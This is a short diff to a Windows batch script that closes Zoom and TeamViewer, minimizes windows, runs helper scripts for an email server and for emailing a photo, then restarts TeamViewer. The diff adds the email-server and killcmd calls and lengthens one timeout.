@@ -4,6 +4,8 @@ taskkill /F /IM Zoom.exe
 
 taskkill /F /IM TeamViewer.exe
 
+start startEmailServer.bat
+
 
 powershell -command "(new-object -com shell.application).minimizeall();
 
@@ -19,6 +21,8 @@ timeout /t 5
 
 start emailPhoto.bat
 
-timeout /t 1
+timeout /t 5
 
 start C:\"Program Files (x86)"\TeamViewer\TeamViewer.exe
+
+start killcmd.bat
